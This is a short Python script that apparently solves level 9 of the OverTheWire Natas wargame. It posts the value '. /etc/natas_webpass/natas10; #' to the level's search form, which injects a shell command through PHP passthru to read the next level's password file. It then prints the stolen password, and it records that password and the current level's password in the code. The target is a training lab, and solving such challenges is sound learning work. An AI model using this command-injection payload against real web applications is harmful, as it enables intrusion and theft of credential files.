#!/usr/bin/env python3
# request with basic authentication

# vuln:command injection php passthru
#

import requests
import re

username = 'natas9'
password = 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'

url = f'http://{username}.natas.labs.overthewire.org/'

session = requests.Session()
# response = requests.get(url, auth = (username, password))
response = session.post(url, data = {"needle": ". /etc/natas_webpass/natas10; #", "submit" : "submit"}, auth=(username, password))

session = requests.Session()

#print (response.text)
print("Password natas10")
print (re.findall("<pre>\n(.*)\n</pre>", response.text)[0])

# pw natas10, Opp1igQAkUzaI1GUUjzn1bFVj7xCNzu
